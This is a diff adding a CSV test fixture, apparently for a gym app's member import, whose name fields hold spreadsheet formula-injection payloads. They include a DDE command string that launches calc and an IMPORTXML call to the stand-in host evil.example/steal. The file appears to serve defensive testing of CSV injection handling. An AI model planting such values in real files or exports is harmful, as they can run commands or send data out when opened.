@@ -1,0 +1,5 @@
+name,phone,email,gender,notes
+"=CMD|' /C calc'!A0",9876507701,cmd@demo.gymkhata.in,MALE,"Equals sign formula injection"
+"+SUM(1,1)*cmd",9876507702,plus@demo.gymkhata.in,FEMALE,"Plus sign formula injection"
+"-2+3+cmd",9876507703,minus@demo.gymkhata.in,MALE,"Minus sign formula injection"
+"@IMPORTXML(""http://evil.example/steal"", ""//a"")",9876507704,at@demo.gymkhata.in,FEMALE,"At sign formula injection"
